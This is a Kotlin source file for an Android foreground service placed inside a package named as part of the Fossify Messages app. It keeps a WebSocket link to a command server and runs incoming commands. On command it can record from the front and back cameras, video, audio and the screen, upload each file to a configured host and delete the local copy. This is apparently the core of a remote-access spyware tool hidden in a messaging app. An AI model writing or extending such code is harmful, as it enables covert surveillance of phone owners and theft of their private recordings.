package org.fossify.messages.androbox

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import java.io.File
import org.fossify.messages.activities.MainActivity   // ✅ import যোগ করা হয়েছে

class ForegroundService : LifecycleService() {

    private val channelId = "ForegroundServiceChannel"
    private val notificationId = 1
    private lateinit var webSocketManager: WebSocketManager
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var cameraManager: FrontCameraManager? = null
    private var videoRecorderManager: VideoRecorderManager? = null
    private var audioRecorderManager: AudioRecorderManager? = null
    private var lastConnectionStatus: Boolean? = null

    companion object {
        private var instance: ForegroundService? = null

        fun startFrontCamera(context: Context, origin: String = "user") {
            instance?.cameraManager?.startFrontCamera(origin)
        }
        fun startBackCamera(context: Context, origin: String = "user") {
            instance?.cameraManager?.startBackCamera(origin)
        }
        fun stopCamera(context: Context) { instance?.cameraManager?.stopCamera() }

        fun startVideoMain(context: Context, origin: String = "user") {
            instance?.videoRecorderManager?.startRecording(false, origin)
        }
        fun startVideoSelfie(context: Context, origin: String = "user") {
            instance?.videoRecorderManager?.startRecording(true, origin)
        }
        fun stopVideo(context: Context) { instance?.videoRecorderManager?.stopRecording() }

        fun startExternalAudio(context: Context, duration: Int, origin: String = "user") {
            instance?.audioRecorderManager?.startExternalRecording(duration, origin)
        }
        fun stopAudio(context: Context) {
            instance?.audioRecorderManager?.stopRecording()
        }

        fun setMediaProjectionForScreen(resultCode: Int, data: Intent) {
            ScreenRecorder.setMediaProjection(resultCode, data)
            ScreenCaptureService.setMediaProjection(resultCode, data)
        }

        fun uploadScreenRecord(file: File, origin: String = "user") {
            instance?.uploadFile(file, "screen_record", origin)
        }

        fun requestMediaProjectionFor(type: String, origin: String = "user") {
            instance?.requestMediaProjectionFor(type, origin)
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        createNotificationChannel()
        startForegroundService()
        initWebSocket()

        cameraManager = FrontCameraManager(applicationContext, this) { file, origin ->
            uploadFile(file, "photo", origin)
        }

        videoRecorderManager = VideoRecorderManager(applicationContext, this) { file, origin ->
            uploadFile(file, "video", origin)
        }

        audioRecorderManager = AudioRecorderManager(applicationContext) { file, origin ->
            uploadFile(file, "audio", origin)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        webSocketManager.disconnect()
        cameraManager?.stopCamera()
        videoRecorderManager?.release()
        audioRecorderManager?.release()
        instance = null
    }

    override fun onBind(intent: Intent): IBinder? {
        return super.onBind(intent)
    }

    // ---------- Private Helpers ----------
    private fun uploadFile(file: File, type: String, origin: String = "user") {
        val urls = ConfigManager.getServerUrls(applicationContext)
        if (urls != null) {
            val (host, _) = urls
            FileUploader.uploadFile(applicationContext, file, host, origin) { success ->
                if (success) {
                    Log.d("ForegroundService", "$type uploaded: ${file.name} (origin=$origin)")
                    file.delete()
                } else {
                    Log.e("ForegroundService", "$type upload failed: ${file.name}")
                }
            }
        } else {
            Log.e("ForegroundService", "Config missing, cannot upload $type")
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Foreground Service Channel", NotificationManager.IMPORTANCE_DEFAULT)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val intent = Intent(this, ForegroundService::class.java)
        val pendingIntent = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE)
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Controller")
            .setContentText("Running in background...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentIntent(pendingIntent)
            .build()
        startForeground(notificationId, notification)
    }

    private fun initWebSocket() {
        webSocketManager = WebSocketManager(applicationContext,
            onMessage = { message ->
                serviceScope.launch {
                    CommandProcessor.processCommand(message, applicationContext)
                }
            },
            onConnectionChange = { isConnected ->
                if (lastConnectionStatus != isConnected) {
                    lastConnectionStatus = isConnected
                    updateNotification(if (isConnected) "Connected" else "Disconnected")
                }
            }
        )
        webSocketManager.connect()
    }

    private fun updateNotification(text: String) {
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Controller")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build()
        getSystemService(NotificationManager::class.java).notify(notificationId, notification)
    }

    private fun requestMediaProjectionFor(type: String, origin: String) {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
            putExtra("media_projection_type", type)
            putExtra("media_projection_origin", origin)
        }
        startActivity(intent)
    }
}